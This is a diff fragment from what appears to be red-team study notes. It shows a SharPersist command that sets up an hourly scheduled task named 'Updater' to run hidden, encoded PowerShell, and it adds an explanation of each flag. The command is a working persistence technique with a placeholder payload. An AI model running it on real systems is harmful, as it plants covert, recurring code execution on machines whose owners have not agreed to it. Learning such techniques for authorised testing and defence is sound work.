@@ -34,3 +34,12 @@ The above snippet will produce a Base64 string which will be supplied in the sni
 ```powershell
 .\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64 ENCODED STRING HERE" -n "Updater" -m add -o hourly
 ```
+
+
+    -t --> the desired persistence technique.
+    -c --> command to execute.
+    -a --> any arguments for that command.
+    -n --> the name of the task.
+    -m --> to add the task (you can also remove, check and list).
+    -o --> the task frequency.
+
